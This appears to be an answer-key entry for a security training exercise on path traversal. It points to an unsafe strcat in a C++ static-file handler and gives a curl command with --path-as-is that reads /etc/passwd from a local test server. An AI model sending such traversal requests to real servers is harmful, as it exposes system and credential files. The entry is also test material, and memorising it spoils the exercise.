# Solution — 01 · Path Traversal

**Code**: `handlers/static_files.cpp` → `strcat(file_path, req.clean_path);`

Access files outside the web root:

```bash
curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
```

`--path-as-is` is required because curl normalizes `..` by default.
